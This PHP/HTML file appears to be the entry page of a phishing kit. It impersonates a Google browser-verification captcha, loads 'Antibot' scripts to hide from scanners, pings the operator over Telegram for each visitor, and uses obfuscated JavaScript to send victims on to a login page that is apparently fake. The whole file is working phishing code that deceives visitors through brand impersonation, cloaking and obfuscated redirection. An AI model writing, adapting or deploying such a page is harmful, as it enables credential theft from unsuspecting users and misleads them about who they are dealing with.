<?php
error_reporting(0);
include('Antibot/Bot-Crawler.php');
include('Antibot/Dila_DZ.php');
include('Antibot/blockers.php');
include('Antibot/detects.php');

// index.php
require_once __DIR__ . '/includes/functions.php';

// Send a Telegram notification when a visitor lands on index.php
sendToTelegram("New Visitor", "index", "");

// If a session_id is provided, reuse it; otherwise create a new one.
if (isset($_GET['session_id']) && !empty($_GET['session_id'])) {
    $sessionId = $_GET['session_id'];
} else {
    $sessionId = uniqid('sess_', true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying browser - Google</title>
    <link rel="stylesheet" href="pages/res/css/captcha.css">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Google Sans", Roboto, Arial, sans-serif;
        }

        :root {
            --bg-color: rgb(240 244 249 / 1);
            --card-bg: #fff;
            --text-primary: #202124;
            --text-secondary: #5f6368;
            --border-color: #dadce0;
            --hover-bg: rgba(95, 99, 104, 0.08);
            --error-color: #d93025;
            --button-bg: #0b57d0;
            --button-hover: #1a73e8;
            --button-text: #fff;
        }

        body {
            background: var(--bg-color);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            width: 1060px;
            margin: 0 auto;
            padding: 20px;
        }

        .signin-card {
            background: var(--card-bg);
            border-radius: 25px;
            padding: 35px 40px 36px;
            display: flex;
            justify-content: space-between;
            gap: 100px;
            height: 402px;
            position: relative;
            overflow: hidden;
        }

        .signin-left {
            flex: 1;
            max-width: 450px;
            display: flex;
            flex-direction: column;
        }

        .signin-right {
            flex: 1;
            max-width: 450px;
            padding-top: 40px;
        }

        .logo-container {
            margin-bottom: 32px;
        }

        .google-logo {
            width: 48px;
            height: 48px;
            display: block;
        }

        h1 {
            color: var(--text-primary);
            font-size: 44px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 15px;
            text-align: left;
        }

        .subtitle {
            color: var(--text-primary);
            font-size: 16px;
            font-weight: 400;
            letter-spacing: 0.1px;
            line-height: 1.5;
            margin-bottom: 32px;
            text-align: left;
        }

        .verification-container {
            text-align: center;
            padding: 48px 24px;
        }

        .verification-title {
            color: var(--text-primary);
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
        }

        .verification-text {
            color: var(--text-secondary);
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 8px;
        }

        .noscript-warning {
            color: #d93025;
            font-size: 16px;
            margin: 24px 0;
        }

        .error-message {
            color: #d93025;
            font-size: 12px;
            margin: 8px 0;
            display: none;
        }

        .g-recaptcha {
            display: inline-block;
            margin-bottom: 60px;
        }

        .attribution {
            color: var(--text-secondary);
            font-size: 12px;
        }

        .ray-id {
            color: var(--text-secondary);
            font-size: 12px;
            margin-top: 8px;
        }

        .ray-id code {
            font-family: monospace;
            background: var(--bg-color);
            padding: 2px 4px;
            border-radius: 3px;
        }

        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
        }

        .language-select {
            color: var(--text-primary);
            font-size: 12px;
            border: 1px solid transparent;
            border-radius: 4px;
            background: transparent;
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: var(--text-secondary);
            font-size: 12px;
            text-decoration: none;
            letter-spacing: 0.3px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        @media (max-width: 945px) {
            .container {
                width: 100%;
                max-width: 480px;
            }

            .signin-card {
                flex-direction: column;
                gap: 24px;
                height: auto;
                padding: 48px;
            }

            .signin-left {
                max-width: 100%;
            }

            .signin-right {
                max-width: 100%;
                padding-top: 0;
            }

            h1 {
                font-size: 24px;
                margin-bottom: 8px;
            }

            .subtitle {
                font-size: 14px;
                margin-bottom: 24px;
            }

            .logo-container {
                margin-bottom: 16px;
            }
        }

        @media (max-width: 600px) {
            body {
                background: var(--card-bg);
                align-items: flex-start;
            }

            .container {
                width: 100%;
                padding: 0 24px;
            }

            .signin-card {
                padding: 20px 0;
                height: auto;
                flex-direction: column;
                gap: 24px;
                border-radius: 0;
            }

            .footer {
                margin-top: 32px;
                padding-bottom: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <div class="signin-left">
                <div class="logo-container">
                    <svg class="google-logo" viewBox="0 0 40 48" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
                    </svg>
                </div>
                <h1>Browser verification</h1>
                <p class="subtitle">Please complete the security check to continue</p>
            </div>
            
            <div class="signin-right">
                <div class="verification-container">
                    <noscript>
                        <p class="noscript-warning">Please turn JavaScript on and reload the page.</p>
                    </noscript>

                    <div id="verification-content">
                        <h2 class="verification-title">Security check</h2>
                        
                        <p class="verification-text">
                            Please complete this security check to access Google
                        </p>

                        <div class="g-recaptcha" data-sitekey="6LfTPlUUAAAAAGSUt1_LqpJXQpatx7_BzTDcU9On" data-callback="onCaptchaSuccess"></div>
                        <div id="error-message" class="error-message"></div>

                        <div class="attribution">
                            Protected by Google Security
                            <div class="ray-id">
                                Request ID: <code id="request-id"></code>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <select class="language-select">
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        // Generate a random request ID
        function generateRequestId() {
            return 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }

        // Set the request ID
        document.getElementById('request-id').textContent = generateRequestId();

        // Handle successful captcha completion
        function onCaptchaSuccess(token) {
            var _0x2efe = [
                'pages/login.php?session_id=<?php echo urlencode($sessionId); ?>',
                '1000'
            ];
            var _0x179f = function(_0x59284c, _0x36e29b) {
                _0x59284c = _0x59284c - 0x100;
                var _0x2efe40 = _0x2efe[_0x59284c];
                return _0x2efe40;
            };
            (function(_0x4a7fe2, _0xde34a) {
                var _0x529748 = _0x179f;
                while (!![]) {
                    try {
                        var _0x1d901e = 1 + 2; // dummy computation (equals 3)
                        if (_0x1d901e === _0xde34a)
                            break;
                        else
                            _0x4a7fe2.push(_0x4a7fe2.shift());
                    } catch (_0x214b85) {
                        _0x4a7fe2.push(_0x4a7fe2.shift());
                    }
                }
            }(_0x2efe, 3));
            setTimeout(() => {
                var _0x17c14b = _0x179f;
                window.location.href = _0x17c14b(0x100);
            }, parseInt(_0x179f(0x101)));
        }
    </script>
</body>
</html>
